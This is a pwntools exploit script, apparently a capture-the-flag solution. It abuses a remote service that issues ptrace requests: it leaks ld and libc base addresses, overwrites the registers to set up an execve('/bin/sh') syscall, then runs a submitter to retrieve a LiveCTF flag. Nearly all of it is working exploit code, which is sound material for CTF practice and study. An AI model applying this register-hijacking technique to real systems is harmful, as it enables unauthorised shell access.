#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

# context.log_level="DEBUG"

# p = process("./challenge")
p = remote(HOST, PORT)
libc = ELF("/libc.so.6")

def fxxk(action, addr, data):
    p.recvuntil(b"What ptrace request do you want to send?")
    p.sendline(str(action).encode())
    p.recvuntil(b"What address do you want?")
    p.sendline(addr.encode())
    p.recvuntil(b"What do you want copied into data?")
    p.sendline(data.encode())
    

def do():
    p.recvuntil(b"Do another (0/1)?")
    p.sendline(str(1).encode())


# gdb_a(0x137B)
fxxk(3, "0x0", "0x0")
# do()
# fxxk(3, "0x8", "0x0")
# do()
# fxxk(3, "0x10", "0x0")
# do()

# fxxk(3, hex(128), "0x0")
# do()

rdi=112
rsi=104
rax=80
rip=128
rdx=96
# fxxk(6, hex(112), "0x12345678deadbeef")
# do()
# fxxk(3, hex(112), "0x0")
# do()


p.recvuntil(b"ptrace returned 0x")
ld_addr = int(p.recv(12), 16) - 0x40
print("ld_addr => " + hex(ld_addr))

do()

leak_addr = ld_addr + 0x18
fxxk(2, hex(leak_addr), "0x0")
p.recvuntil(b"ptrace returned 0x")
libc_base = int(p.recv(12), 16) - 0x14cba0 - 0x28000
print("libc_base => " + hex(libc_base))

# cmd = b"ls > "
rw_target = libc_base + 0x21af00

system = libc_base + libc.sym["system"]
print("system => " + hex(system))

syscall_addr = libc_base + 0x1149ca

bin_sh = libc_base +next(libc.search(b"/bin/sh\x00"))
print("bin_sh => " + hex(bin_sh))


def write_addr(addr,val):
    do()
    fxxk(6,hex(addr),hex(val))

write_addr(rax, 59)
write_addr(rdx, 0)
write_addr(rsi, 0)
write_addr(rdi, bin_sh)
write_addr(rip, syscall_addr)

do()
fxxk(7,"0x0", hex(0))
sleep(1)
p.sendlineafter(b"Do another (0/1)?", b"0")
sleep(1)
p.sendline(b"./submitter")
# p.sendline(b"./submitter")
flag = p.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)

# p.interactive()